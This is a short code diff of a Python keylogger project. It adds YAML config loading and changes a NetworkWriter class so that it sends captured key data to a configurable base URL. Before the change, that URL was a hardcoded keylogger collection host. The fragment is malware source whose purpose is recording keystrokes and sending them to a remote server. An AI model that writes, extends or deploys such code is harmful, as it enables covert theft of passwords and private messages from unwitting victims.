@@ -1,5 +1,12 @@
-import requests,time,ToolBox,pygetwindow,json,os,base64
+import requests,time,ToolBox,pygetwindow,json,os,base64,yaml
 from Interface import IKeyLogger,Write
+
+with open("config.yaml", "r") as f:
+    config = yaml.safe_load(f)
+
+URL = config['general']['base_url']
+
+
 class KeyLoggerService(IKeyLogger):
     def __init__(self):
         self.__logged_keys = {}
@@ -56,7 +63,7 @@ class FileWriter(Write):
 
 class NetworkWriter(Write):
     def __init__(self):
-        self.url =  "https://keylogger.shuvax.com"
+        self.url =  URL
     def write(self, serial_number, data:dict[str:str]) -> bool:
         if not data:
             return True
